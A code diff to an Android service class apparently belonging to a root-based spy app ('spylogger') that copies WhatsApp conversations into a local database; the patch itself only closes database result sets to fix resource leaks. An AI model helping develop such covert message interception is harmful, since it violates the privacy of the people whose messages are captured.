@@ -24,6 +24,7 @@ import com.stericson.RootTools.RootTools;
 import com.stericson.RootTools.execution.CommandCapture;
 
 import java.io.File;
+import java.io.IOException;
 import java.sql.SQLException;
 import java.util.ArrayList;
 import java.util.Date;
@@ -175,7 +176,7 @@ public class WhatsAppService extends Service {
     }
 
     private void updateMsgs(List<Topico> topicos){
-        GenericRawResults<Object[]> rawResults;
+        GenericRawResults<Object[]> rawResults=null;
         List<Mensagem> mensagens = new ArrayList<>();
         Iterator<Object[]> iterator;
         try {
@@ -198,7 +199,11 @@ public class WhatsAppService extends Service {
                     if(!mensagens.isEmpty()){
                         dbHelper.getDao(Mensagem.class).create(mensagens);
                     }
-                   updateMsgs(topicos);
+                    try {
+                        rawResults.close();
+                    } catch (IOException e) {
+                    }
+                    updateMsgs(topicos);
                    return;
                 }
 
@@ -269,6 +274,12 @@ public class WhatsAppService extends Service {
                     }
                 }catch (Exception e){
                     dbHelper.getDao(Mensagem.class).create(mensagens);
+                    try {
+                        if(rawResults!=null) {
+                            rawResults.close();
+                        }
+                    } catch (IOException ee) {
+                    }
                     updateMsgs(topicos);
                 }
             }
@@ -276,9 +287,12 @@ public class WhatsAppService extends Service {
         }catch (SQLException e){
             Log.e("spylogger",e.getMessage());
         }finally {
-            rawResults=null;
-            mensagens = null;
-            iterator=null;
+            try {
+                if(rawResults!=null) {
+                    rawResults.close();
+                }
+            } catch (IOException e) {
+            }
         }
     }
 }
